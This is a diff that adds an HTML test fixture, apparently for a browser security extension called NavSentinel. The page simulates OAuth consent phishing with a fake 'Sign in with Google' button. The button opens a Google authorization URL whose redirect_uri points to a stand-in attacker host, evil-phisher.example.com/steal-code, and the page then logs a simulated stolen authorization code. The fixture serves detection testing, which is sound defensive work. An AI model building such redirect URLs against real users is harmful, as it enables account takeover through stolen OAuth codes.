@@ -1,0 +1,127 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>OAuth 01 - Consent Phishing with Redirect Mismatch</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 24px;
+      max-width: 700px;
+      margin: 0 auto;
+    }
+    h1 { margin-top: 0; }
+    .attack-surface {
+      margin: 24px 0;
+      padding: 32px;
+      background: #ffebee;
+      border: 2px solid #e53935;
+      border-radius: 12px;
+      text-align: center;
+    }
+    .fake-oauth {
+      display: inline-block;
+      padding: 16px 32px;
+      background: #4285f4;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .fake-oauth:hover {
+      background: #3367d6;
+    }
+    .log {
+      margin-top: 24px;
+      font-family: monospace;
+      font-size: 13px;
+      background: #1a1a1a;
+      color: #aaffaa;
+      padding: 12px;
+      border-radius: 8px;
+      max-height: 200px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+    }
+    .note {
+      font-size: 13px;
+      color: #666;
+      margin-top: 16px;
+    }
+  </style>
+</head>
+<body>
+  <h1>OAuth 01 - Consent Phishing with Redirect Mismatch</h1>
+  <p>
+    Simulates an OAuth consent phishing attack. The page initiates an OAuth
+    authorization flow with a legitimate-looking provider URL, but the
+    <code>redirect_uri</code> points to the attacker's domain. After
+    "consent" is granted, the callback redirects to the attacker's server
+    which steals the authorization code.
+  </p>
+  <p><strong>Expected:</strong> NavSentinel detects the OAuth flow, flags the
+    redirect_uri mismatch, and elevates the NRS score.</p>
+
+  <div class="attack-surface">
+    <p>Sign in with your Google account to continue:</p>
+    <button class="fake-oauth" id="signInBtn">Sign in with Google</button>
+  </div>
+
+  <div class="log" id="log"></div>
+
+  <p class="note">
+    In a real attack, the OAuth URL would point to the legitimate provider
+    (accounts.google.com) but with a <code>redirect_uri</code> controlled
+    by the attacker. The victim sees the real Google consent page but the
+    authorization code is sent to the attacker.
+  </p>
+
+  <script>
+    const log = document.getElementById("log");
+    const signInBtn = document.getElementById("signInBtn");
+
+    function addLog(msg) {
+      const line = `[${new Date().toISOString().slice(11,23)}] ${msg}\n`;
+      log.textContent += line;
+      log.scrollTop = log.scrollHeight;
+    }
+
+    // Simulate the attack: the OAuth URL has a mismatched redirect_uri
+    const fakeOAuthUrl =
+      "https://accounts.google.com/o/oauth2/v2/auth" +
+      "?client_id=fake-client-id-12345.apps.googleusercontent.com" +
+      "&redirect_uri=https://evil-phisher.example.com/steal-code" +
+      "&response_type=code" +
+      "&scope=openid+email+profile" +
+      "&state=random-state-value";
+
+    signInBtn.addEventListener("click", () => {
+      addLog("User clicked 'Sign in with Google'");
+      addLog("Opening OAuth authorization URL...");
+      addLog("redirect_uri = https://evil-phisher.example.com/steal-code");
+      addLog("ATTACK: redirect_uri does NOT match the legitimate app's domain!");
+
+      // This window.open should be intercepted by NavSentinel's main_guard.
+      // The OAuth monitor should detect the flow and flag the suspicious
+      // redirect_uri pattern (cross-site popup with OAuth indicators).
+      const child = window.open(fakeOAuthUrl, "_blank");
+      if (child) {
+        addLog("OAuth popup opened (NavSentinel should flag this).");
+
+        // Simulate the callback arriving at the attacker's domain
+        setTimeout(() => {
+          addLog("Simulating callback to attacker domain...");
+          addLog("https://evil-phisher.example.com/steal-code?code=STOLEN_AUTH_CODE");
+          addLog("ATTACK SUCCESS: Attacker captured the authorization code!");
+        }, 2000);
+      } else {
+        addLog("OAuth popup blocked by NavSentinel (expected).");
+      }
+    });
+
+    addLog("Fixture loaded. Click 'Sign in with Google' to simulate the consent phishing attack.");
+  </script>
+</body>
+</html>
